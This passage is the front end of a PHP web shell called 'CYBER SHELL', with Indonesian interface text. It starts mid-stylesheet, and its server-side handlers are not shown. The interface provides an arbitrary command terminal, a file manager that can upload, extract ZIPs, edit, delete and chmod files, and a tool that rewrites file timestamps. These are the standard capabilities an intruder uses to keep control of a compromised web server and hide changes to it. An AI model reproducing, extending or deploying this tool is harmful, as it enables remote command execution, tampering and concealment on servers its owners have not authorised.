        }

        .cyber-input {
            background: rgba(0, 0, 0, 0.25);
            border: 1px solid #00ffaa;
            color: #fff;
            padding: 8px 15px;
            border-radius: 30px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 13px;
            outline: none;
            transition: all 0.3s;
            min-width: 140px;
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
        }

        .cyber-input:focus {
            border-color: #00ffaa;
            box-shadow: 0 0 20px rgba(0, 255, 170, 0.5);
            background: rgba(0, 0, 0, 0.35);
        }

        .cyber-button {
            background: rgba(0, 0, 0, 0.25);
            border: 1px solid #00ffaa;
            color: #00ffaa;
            padding: 8px 18px;
            border-radius: 30px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 13px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
        }

        .cyber-button:hover {
            background: rgba(0, 255, 170, 0.2);
            color: #fff;
            box-shadow: 0 0 20px rgba(0, 255, 170, 0.5);
        }

        .cyber-button.scan {
            border-color: #ffaa00;
            color: #ffaa00;
        }

        .cyber-button.scan:hover {
            background: rgba(255, 170, 0, 0.2);
            color: #fff;
            box-shadow: 0 0 20px rgba(255, 170, 0, 0.5);
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            background: transparent;
            backdrop-filter: blur(3px);
            -webkit-backdrop-filter: blur(3px);
            margin-bottom: 10px;
            border: none;
        }

        .file-table th {
            background: rgba(0, 0, 0, 0.25);
            color: #00ffaa;
            font-weight: normal;
            text-transform: uppercase;
            letter-spacing: 1.5px;
            font-size: 12px;
            padding: 12px 15px;
            text-align: left;
            border: none;
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
        }

        .file-table td {
            padding: 10px 15px;
            border: none;
            color: #e0e0e0;
            background: transparent;
        }

        .file-table tr:hover td {
            background: rgba(0, 255, 170, 0.1);
        }

        .dir-item {
            color: #ffaa00;
            font-weight: bold;
            cursor: pointer;
        }

        .file-item {
            color: #00ffaa;
            cursor: pointer;
        }

        .size {
            color: #88aaff;
        }

        .perms {
            font-family: monospace;
            font-weight: bold;
            cursor: pointer;
        }

        .perm-755 {
            color: #00ff00;
            text-shadow: 0 0 12px #00ff00, 0 0 20px #00ff00;
            font-weight: bold;
        }

        .perm-644 {
            color: #88ff88;
            text-shadow: 0 0 8px #88ff88, 0 0 15px #88ff88;
            font-weight: bold;
        }

        .perm-444 {
            color: #ff5555;
            text-shadow: 0 0 12px #ff5555, 0 0 20px #ff5555;
            font-weight: bold;
        }

        .perm-777 {
            color: #ffff00;
            text-shadow: 0 0 12px #ffff00, 0 0 20px #ffff00;
            font-weight: bold;
        }

        .perm-other {
            color: #ffaa88;
        }

        .date {
            color: #aaff88;
            cursor: pointer;
            text-decoration: underline dotted;
        }

        .date:hover {
            color: #ffffff;
        }

        .owner {
            color: #ffaa88;
            font-size: 12px;
        }

        .actions {
            white-space: nowrap;
        }

        .action-link {
            color: #88aaff;
            text-decoration: none;
            margin: 0 2px;
            font-size: 11px;
            transition: all 0.3s;
            display: inline-block;
            padding: 3px 5px;
            border: 1px solid transparent;
            border-radius: 3px;
            cursor: pointer;
        }

        .action-link:hover {
            color: #00ffaa;
            border-color: #00ffaa;
            background: rgba(0, 255, 170, 0.15);
        }

        .action-link.delete:hover {
            color: #ff5555;
            border-color: #ff5555;
            background: rgba(255, 85, 85, 0.15);
        }

        .action-link.direct:hover {
            color: #ffff00;
            border-color: #ffff00;
            background: rgba(255, 255, 0, 0.15);
        }

        .terminal {
            margin: 5px 0;
            border: 2px solid #00ffaa;
            border-radius: 8px;
            overflow: hidden;
            background: rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(3px);
            -webkit-backdrop-filter: blur(3px);
        }

        .terminal-header {
            background: rgba(0, 0, 0, 0.25);
            padding: 10px 20px;
            border-bottom: 1px solid #00ffaa;
            color: #00ffaa;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
        }

        .terminal-body {
            background: rgba(0, 0, 0, 0.15);
            padding: 15px 20px;
            max-height: 250px;
            overflow-y: auto;
            color: #aaffaa;
            font-family: 'Share Tech Mono', monospace;
            font-size: 13px;
            white-space: pre-wrap;
            word-wrap: break-word;
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
        }

        .terminal-input {
            display: flex;
            background: rgba(0, 0, 0, 0.2);
            border-top: 1px solid #00ffaa;
        }

        .terminal-input input {
            flex: 1;
            background: rgba(0, 0, 0, 0.15);
            border: none;
            color: #00ffaa;
            padding: 10px 20px;
            font-family: 'Share Tech Mono', monospace;
            outline: none;
        }

        .terminal-input button {
            background: rgba(0, 0, 0, 0.25);
            border: none;
            border-left: 1px solid #00ffaa;
            color: #00ffaa;
            padding: 10px 25px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }

        .terminal-input button:hover {
            background: rgba(0, 255, 170, 0.2);
            color: #fff;
        }

        .editor-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            z-index: 1000;
            display: none;
            justify-content: center;
            align-items: center;
        }

        .editor-modal {
            width: 80%;
            height: 80%;
            background: rgba(10, 20, 20, 0.9);
            border: 2px solid #00ffaa;
            border-radius: 10px;
            padding: 20px;
            display: flex;
            flex-direction: column;
        }

        .editor-modal textarea {
            flex: 1;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ffaa;
            color: #fff;
            padding: 15px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 14px;
            border-radius: 5px;
            outline: none;
            resize: none;
        }

        .editor-buttons {
            margin-top: 15px;
            display: flex;
            gap: 10px;
            justify-content: flex-end;
        }

        .upload-group {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }

        .upload-label {
            background: rgba(0, 0, 0, 0.25);
            border: 1px solid #00ffaa;
            color: #00ffaa;
            padding: 8px 15px;
            border-radius: 30px;
            cursor: pointer;
            font-size: 13px;
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
        }

        .upload-label:hover {
            background: rgba(0, 255, 170, 0.15);
            color: #fff;
        }

        input[type="file"] {
            display: none;
        }

        .datetime-picker {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.95);
            border: 2px solid #00ffaa;
            border-radius: 10px;
            padding: 20px;
            z-index: 2000;
            display: none;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }

        .datetime-picker input {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ffaa;
            color: #00ffaa;
            padding: 10px;
            border-radius: 5px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 14px;
            margin: 5px 0;
            width: 100%;
        }

        .datetime-picker button {
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ffaa;
            color: #00ffaa;
            padding: 8px 15px;
            border-radius: 5px;
            margin: 5px;
            cursor: pointer;
        }

        .datetime-picker button:hover {
            background: rgba(0, 255, 170, 0.2);
        }

        @media (max-width: 768px) {
            .glitch { font-size: 2rem; }
            .action-bar { flex-direction: column; }
            .action-group { flex-wrap: wrap; }
            .upload-group { flex-direction: column; }
            .header { flex-direction: column; text-align: center; }
        }
    </style>
</head>
<body>
    <div class="glitch-container">
        <div class="glitch">
            <span>I</span>
            <span>T</span>
            <span>'</span>
            <span>S</span>
            <span>&nbsp;</span>
            <span>M</span>
            <span>E</span>
            <span>&nbsp;</span>
            <span>Z</span>
            <span>Y</span>
        </div>
    </div>

    <div class="container">
        <div class="header">
            <div class="logo">
                <h1>CYBER SHELL</h1>
                <small>v1.0 • it's me zy</small>
            </div>
            <div class="status">
                <span>🔵 SYSTEM: <?=php_uname('s')?></span>
                <span style="margin-left: 15px;">⚡ PHP: <?=PHP_VERSION?></span>
                <span style="margin-left: 15px;">👤 SERVER: <?=$server_user?></span>
            </div>
        </div>

        <div id="notification-container" style="display: none;"></div>
        <div id="error-container" style="display: none;"></div>

        <div class="path" id="breadcrumb-container"></div>

        <div class="action-bar">
            <div class="action-group">
                <input type="text" id="new-folder-name" class="cyber-input" placeholder="New Folder" onkeypress="if(event.key==='Enter') createFolder()">
                <button onclick="createFolder()" class="cyber-button">CREATE</button>
            </div>

            <div class="action-group">
                <input type="text" id="new-file-name" class="cyber-input" placeholder="New File" onkeypress="if(event.key==='Enter') createFile()">
                <button onclick="createFile()" class="cyber-button">CREATE</button>
            </div>

            <div class="action-group upload-group">
                <form id="upload-form" enctype="multipart/form-data" style="display: flex; gap: 5px; align-items: center;">
                    <label for="normal-upload" class="upload-label">UPLOAD</label>
                    <input type="file" name="file" id="normal-upload" onchange="uploadFile(this)">
                </form>
                
                <form id="upload-zip-form" enctype="multipart/form-data" style="display: flex; gap: 5px; align-items: center;">
                    <label for="zip-upload" class="upload-label">UPLOAD + EXTRACT</label>
                    <input type="file" name="file" id="zip-upload" accept=".zip" onchange="uploadAndExtract(this)">
                </form>
            </div>
        </div>

        <div id="file-list-container">
            <table class="file-table" id="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Perms</th>
                        <th>Owner</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="file-list-body"></tbody>
            </table>
        </div>

        <div class="terminal">
            <div class="terminal-header">
                <span>TERMINAL</span>
                <span>it's me zy@cyber:~$</span>
            </div>
            <div class="terminal-body" id="terminal-output">Welcome to Cyber Terminal. Type your commands below...</div>
            <div class="terminal-input">
                <input type="text" id="terminal-cmd" placeholder="Enter command..." onkeypress="if(event.key==='Enter') executeCommand()">
                <button onclick="executeCommand()">EXEC</button>
            </div>
        </div>
    </div>

    <div class="editor-overlay" id="editor-overlay">
        <div class="editor-modal">
            <textarea id="editor-content"></textarea>
            <div class="editor-buttons">
                <button class="cyber-button" onclick="saveFile()">SAVE</button>
                <button class="cyber-button" style="border-color: #ff5555; color: #ff5555;" onclick="closeEditor()">CANCEL</button>
            </div>
        </div>
    </div>

    <div class="datetime-picker" id="datetime-picker">
        <h3 style="color: #00ffaa; margin-bottom: 10px;">Ubah Tanggal & Waktu</h3>
        <input type="datetime-local" id="new-datetime" step="1">
        <div style="text-align: center; margin-top: 15px;">
            <button onclick="confirmDateChange()">UBAH</button>
            <button onclick="closeDateTimePicker()">BATAL</button>
        </div>
    </div>

    <script>
        let currentEditFile = '';
        let currentTouchItem = '';
        const homePath = '<?= addslashes($home_path) ?>';
        let notificationTimeout = null;
        let errorTimeout = null;

        function showNotification(message) {
            if (notificationTimeout) {
                clearTimeout(notificationTimeout);
            }
            
            const container = document.getElementById('notification-container');
            container.style.display = 'block';
            container.innerHTML = '<div class="notification-message">✅ ' + message + '</div>';
            
            notificationTimeout = setTimeout(() => {
                container.style.display = 'none';
                container.innerHTML = '';
                notificationTimeout = null;
            }, 5000);
        }

        function showError(message) {
            if (errorTimeout) {
                clearTimeout(errorTimeout);
            }
            
            const container = document.getElementById('error-container');
            container.style.display = 'block';
            container.innerHTML = '<div class="error-message">❌ ' + message + '</div>';
            
            errorTimeout = setTimeout(() => {
                container.style.display = 'none';
                container.innerHTML = '';
                errorTimeout = null;
            }, 5000);
        }

        async function ajaxRequest(action, data = {}) {
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', action);
            
            for (let key in data) {
                formData.append(key, data[key]);
            }

            try {
                const response = await fetch('', {
                    method: 'POST',
                    body: formData
                });
                return await response.json();
            } catch (error) {
                showError('Network error: ' + error.message);
                return { success: false, error: 'Network error' };
            }
        }

        async function loadDirectory() {
            const result = await ajaxRequest('list');
            if (result.success && result.data) {
                renderBreadcrumb(result.data.breadcrumb);
                renderFileList(result.data.items);
            }
        }

        function renderBreadcrumb(breadcrumb) {
            const container = document.getElementById('breadcrumb-container');
            let html = '';
            html += `<span class="crumb-item" onclick="goHome()">🏠 HOME</span>`;
            html += ' / ';
            for (let i = 0; i < breadcrumb.length; i++) {
                const crumb = breadcrumb[i];
                html += `<span class="crumb-item" onclick="navigateTo('${crumb.path.replace(/'/g, "\\'")}')">${crumb.name}</span>`;
                if (i < breadcrumb.length - 1) {
                    html += ' / ';
                }
            }
            container.innerHTML = html;
        }

        function renderFileList(items) {
            const tbody = document.getElementById('file-list-body');
            let html = '';
            
            if (items.length === 0) {
                html = '<tr><td colspan="6" style="text-align: center; padding: 20px;">Empty directory</td></tr>';
            } else {
                for (let item of items) {
                    const nameClass = item.is_dir ? 'dir-item' : 'file-item';
                    const nameHtml = item.is_dir 
                        ? `<span class="${nameClass}" onclick="navigateToDir('${item.name.replace(/'/g, "\\'")}')">📁 ${item.name}</span>`
                        : `<span class="${nameClass}" onclick="editFile('${item.name.replace(/'/g, "\\'")}')">📄 ${item.name}</span>`;
                    
                    const permsDisplay = item.perms;
                    const permsClass = item.perm_class;
                    
                    html += '<tr>';
                    html += `<td>${nameHtml}</td>`;
                    html += `<td class="size">${item.size}</td>`;
                    html += `<td class="perms ${permsClass}" onclick="chmodItem('${item.name.replace(/'/g, "\\'")}', '${item.perms.replace('d', '')}')">${permsDisplay}</td>`;
                    html += `<td class="owner">${item.owner}</td>`;
                    html += `<td class="date" onclick="openDateTimePicker('${item.name.replace(/'/g, "\\'")}', '${item.modified}')">${item.modified}</td>`;
                    html += `<td class="actions">`;
                    
                    if (!item.is_dir) {
                        html += `<span class="action-link" onclick="editFile('${item.name.replace(/'/g, "\\'")}')">EDIT</span>`;
                        html += `<span class="action-link direct" onclick="getDirectLink('${item.name.replace(/'/g, "\\'")}')">DIRECT</span>`;
                    }
                    html += `<span class="action-link" onclick="renameItem('${item.name.replace(/'/g, "\\'")}')">RENAME</span>`;
                    html += `<span class="action-link delete" onclick="deleteItem('${item.name.replace(/'/g, "\\'")}')">DELETE</span>`;
                    
                    html += `</td>`;
                    html += '</tr>';
                }
            }
            
            tbody.innerHTML = html;
        }

        function goHome() {
            navigateTo(homePath);
        }

        async function navigateTo(path) {
            const result = await ajaxRequest('navigate', { path: path });
            if (result.success) {
                await loadDirectory();
            } else if (result.error) {
                showError(result.error);
            }
        }

        function navigateToDir(dirname) {
            navigateTo(dirname);
        }

        async function deleteItem(name) {
            if (confirm(`Delete ${name}?`)) {
                const result = await ajaxRequest('delete', { target: name });
                if (result.success) {
                    if (result.notification) showNotification(result.notification);
                    await loadDirectory();
                } else {
                    showError(result.error || 'Failed to delete');
                }
            }
        }

        function renameItem(oldName) {
            const newName = prompt('Enter new name:', oldName);
            if (newName && newName !== oldName) {
                ajaxRequest('rename', { old: oldName, new: newName }).then(result => {
                    if (result.success) {
                        if (result.notification) showNotification(result.notification);
                        loadDirectory();
                    } else {
                        showError(result.error);
                    }
                });
            }
        }

        function createFolder() {
            const name = document.getElementById('new-folder-name').value.trim();
            if (name) {
                ajaxRequest('newfolder', { name: name }).then(result => {
                    if (result.success) {
                        document.getElementById('new-folder-name').value = '';
                        if (result.notification) showNotification(result.notification);
                        loadDirectory();
                    } else {
                        showError(result.error);
                    }
                });
            } else {
                showError('❌ Nama folder tidak boleh kosong');
            }
        }

        function createFile() {
            const name = document.getElementById('new-file-name').value.trim();
            if (name) {
                ajaxRequest('newfile', { name: name }).then(result => {
                    if (result.success) {
                        document.getElementById('new-file-name').value = '';
                        if (result.notification) showNotification(result.notification);
                        loadDirectory();
                    } else {
                        showError(result.error);
                    }
                });
            } else {
                showError('❌ Nama file tidak boleh kosong');
            }
        }

        function uploadFile(input) {
            const file = input.files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', 'upload');
            formData.append('file', file);

            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.success) {
                    if (result.notification) showNotification(result.notification);
                    loadDirectory();
                } else {
                    showError(result.error);
                }
            });
        }

        function uploadAndExtract(input) {
            const file = input.files[0];
            if (!file) return;
            
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', 'upload_extract');
            formData.append('file', file);

            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(res => res.json())
            .then(result => {
                if (result.success) {
                    if (result.notification) showNotification(result.notification);
                    loadDirectory();
                } else {
                    showError(result.error || 'Gagal mengekstrak file ZIP');
                }
            });
        }

        function chmodItem(name, currentPerms) {
            currentPerms = currentPerms.replace('d', '');
            
            const newPerms = prompt('Enter permissions (e.g., 755, 644, 0444):', currentPerms);
            if (newPerms && newPerms !== currentPerms) {
                ajaxRequest('chmod', { target: name, perms: newPerms }).then(result => {
                    if (result.success) {
                        if (result.notification) showNotification(result.notification);
                        loadDirectory();
                    } else {
                        showError(result.error);
                    }
                });
            }
        }

        function openDateTimePicker(name, currentDate) {
            currentTouchItem = name;
            const picker = document.getElementById('datetime-picker');
            const input = document.getElementById('new-datetime');
            
            if (currentDate && currentDate !== '-') {
                const date = new Date(currentDate.replace(' ', 'T'));
                if (!isNaN(date)) {
                    const year = date.getFullYear();
                    const month = String(date.getMonth() + 1).padStart(2, '0');
                    const day = String(date.getDate()).padStart(2, '0');
                    const hours = String(date.getHours()).padStart(2, '0');
                    const minutes = String(date.getMinutes()).padStart(2, '0');
                    const seconds = String(date.getSeconds()).padStart(2, '0');
                    input.value = `${year}-${month}-${day}T${hours}:${minutes}:${seconds}`;
                } else {
                    const now = new Date();
                    const year = now.getFullYear();
                    const month = String(now.getMonth() + 1).padStart(2, '0');
                    const day = String(now.getDate()).padStart(2, '0');
                    const hours = String(now.getHours()).padStart(2, '0');
                    const minutes = String(now.getMinutes()).padStart(2, '0');
                    const seconds = String(now.getSeconds()).padStart(2, '0');
                    input.value = `${year}-${month}-${day}T${hours}:${minutes}:${seconds}`;
                }
            }
            
            picker.style.display = 'block';
        }

        function closeDateTimePicker() {
            document.getElementById('datetime-picker').style.display = 'none';
            currentTouchItem = '';
        }

        function confirmDateChange() {
            const newDate = document.getElementById('new-datetime').value;
            if (newDate && currentTouchItem) {
                const dateObj = new Date(newDate);
                const year = dateObj.getFullYear();
                const month = String(dateObj.getMonth() + 1).padStart(2, '0');
                const day = String(dateObj.getDate()).padStart(2, '0');
                const hours = String(dateObj.getHours()).padStart(2, '0');
                const minutes = String(dateObj.getMinutes()).padStart(2, '0');
                const seconds = String(dateObj.getSeconds()).padStart(2, '0');
                const formattedDate = `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
                
                ajaxRequest('touch', { target: currentTouchItem, date: formattedDate }).then(result => {
                    closeDateTimePicker();
                    if (result.success) {
                        if (result.notification) showNotification(result.notification);
                        loadDirectory();
                    } else {
                        showError(result.error);
                    }
                });
            }
        }

        async function getDirectLink(name) {
            const result = await ajaxRequest('get_direct_link', { target: name });
            if (result.success && result.data) {
                window.open(result.data.url, '_blank');
            } else {
                showError(result.error || 'Gagal mendapatkan direct link');
            }
        }

        async function editFile(name) {
            const result = await ajaxRequest('edit', { target: name });
            if (result.success && result.data) {
                currentEditFile = name;
                document.getElementById('editor-content').value = result.data.content;
                document.getElementById('editor-overlay').style.display = 'flex';
            } else {
                showError(result.error || 'Cannot open file');
            }
        }

        async function saveFile() {
            const content = document.getElementById('editor-content').value;
            const result = await ajaxRequest('save', { target: currentEditFile, content: content });
            if (result.success) {
                closeEditor();
                if (result.notification) showNotification(result.notification);
                loadDirectory();
            } else {
                showError(result.error);
            }
        }

        function closeEditor() {
            document.getElementById('editor-overlay').style.display = 'none';
            currentEditFile = '';
        }

        async function executeCommand() {
            const cmd = document.getElementById('terminal-cmd').value;
            if (!cmd) return;
            
            const result = await ajaxRequest('command', { cmd: cmd });
            if (result.success && result.data) {
                document.getElementById('terminal-output').innerText = result.data.output;
                document.getElementById('terminal-cmd').value = '';
            }
        }

        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.key === 'r') {
                e.preventDefault();
                loadDirectory();
            }
            
            if (e.key === 'Escape') {
                if (document.getElementById('editor-overlay').style.display === 'flex') {
                    closeEditor();
                }
                if (document.getElementById('datetime-picker').style.display === 'block') {
                    closeDateTimePicker();
                }
            }
        });

        loadDirectory();
        setInterval(loadDirectory, 30000);
    </script>
</body>
</html>